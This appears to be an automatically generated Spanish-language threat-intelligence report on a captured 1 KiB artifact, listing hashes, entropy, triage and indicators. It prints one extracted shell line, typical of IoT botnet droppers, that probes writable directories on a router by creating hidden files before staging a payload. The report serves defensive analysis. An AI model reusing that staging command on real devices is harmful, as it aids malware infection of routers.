# 🧬 Payload Analysis

`7efdb79f7c1f045cb94090491559f49a62cd9f370ebb107c3cb2583b66bed9cd`

## 📌 Resumen

Artefacto de 1.0 KiB. Entropía registrada: 5.32. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.


## 🗓️ Registro

- **Registrado:** `2026-08-09T19:50:21.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7efdb79f7c1f045cb94090491559f49a62cd9f370ebb107c3cb2583b66bed9cd`
- **SHA1:** `4b997c43e22b4df0d3cd7a42d08dcde6f33b1b58`
- **MD5:** `99da0fbe5a16482c6af73c492f43d39e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 1.0 KiB |
| Entropía | 5.32 |
| Strings | 25 |

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=data; iocs=2

## 🖥️ Comandos observados / extraídos

```text
[4lcht@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| command | [4lcht@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/ | strings |
| hash | 7efdb79f7c1f045cb94090491559f49a62cd9f370ebb107c3cb2583b66bed9cd | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | unsupported format |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
